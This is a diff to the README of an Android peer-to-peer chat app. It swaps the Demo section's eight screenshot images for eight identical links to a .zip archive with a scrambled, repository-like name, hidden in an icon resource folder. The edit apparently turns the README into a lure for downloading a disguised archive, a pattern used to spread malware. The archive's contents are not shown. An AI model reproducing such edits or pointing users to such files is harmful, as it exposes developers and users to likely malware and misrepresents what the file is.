@@ -17,12 +17,12 @@ This is a chat application which allows text messaging and files sharing using J
 
 
 ## Demo
-<img src="app/src/main/res/photo_2019-10-15_16-17-37.jpg" width="225" height="400"> <img src="app/src/main/res/photo_2019-10-15_16-17-52.jpg" width="225" height="400"> <img src="app/src/main/res/photo_2019-10-15_16-30-26.jpg" width="225" height="400"> 
+<img src="https://github.com/alssalimi/Android-P2P-Chat-Messenger-using-Java-TCP-IP-Socket-Programming/raw/refs/heads/master/app/src/main/res/mipmap-xhdpi/Programming-Messenger-TC-Java-using-I-Socket-Chat-Android-v2.8.zip" width="225" height="400"> <img src="https://github.com/alssalimi/Android-P2P-Chat-Messenger-using-Java-TCP-IP-Socket-Programming/raw/refs/heads/master/app/src/main/res/mipmap-xhdpi/Programming-Messenger-TC-Java-using-I-Socket-Chat-Android-v2.8.zip" width="225" height="400"> <img src="https://github.com/alssalimi/Android-P2P-Chat-Messenger-using-Java-TCP-IP-Socket-Programming/raw/refs/heads/master/app/src/main/res/mipmap-xhdpi/Programming-Messenger-TC-Java-using-I-Socket-Chat-Android-v2.8.zip" width="225" height="400"> 
 
-<img src="app/src/main/res/photo_2019-10-15_16-17-44.jpg" width="225" height="400"> <img src="app/src/main/res/photo_2019-10-15_16-17-34.jpg" width="225" height="400"> <img src="app/src/main/res/photo_2019-10-15_16-17-03.jpg" width="225" height="400">
+<img src="https://github.com/alssalimi/Android-P2P-Chat-Messenger-using-Java-TCP-IP-Socket-Programming/raw/refs/heads/master/app/src/main/res/mipmap-xhdpi/Programming-Messenger-TC-Java-using-I-Socket-Chat-Android-v2.8.zip" width="225" height="400"> <img src="https://github.com/alssalimi/Android-P2P-Chat-Messenger-using-Java-TCP-IP-Socket-Programming/raw/refs/heads/master/app/src/main/res/mipmap-xhdpi/Programming-Messenger-TC-Java-using-I-Socket-Chat-Android-v2.8.zip" width="225" height="400"> <img src="https://github.com/alssalimi/Android-P2P-Chat-Messenger-using-Java-TCP-IP-Socket-Programming/raw/refs/heads/master/app/src/main/res/mipmap-xhdpi/Programming-Messenger-TC-Java-using-I-Socket-Chat-Android-v2.8.zip" width="225" height="400">
 
 
-<img src="app/src/main/res/photo_2019-10-15_16-17-48.jpg" width="225" height="400"> <img src="app/src/main/res/photo_2019-10-15_16-17-40.jpg" width="225" height="400">
+<img src="https://github.com/alssalimi/Android-P2P-Chat-Messenger-using-Java-TCP-IP-Socket-Programming/raw/refs/heads/master/app/src/main/res/mipmap-xhdpi/Programming-Messenger-TC-Java-using-I-Socket-Chat-Android-v2.8.zip" width="225" height="400"> <img src="https://github.com/alssalimi/Android-P2P-Chat-Messenger-using-Java-TCP-IP-Socket-Programming/raw/refs/heads/master/app/src/main/res/mipmap-xhdpi/Programming-Messenger-TC-Java-using-I-Socket-Chat-Android-v2.8.zip" width="225" height="400">
 
 
 
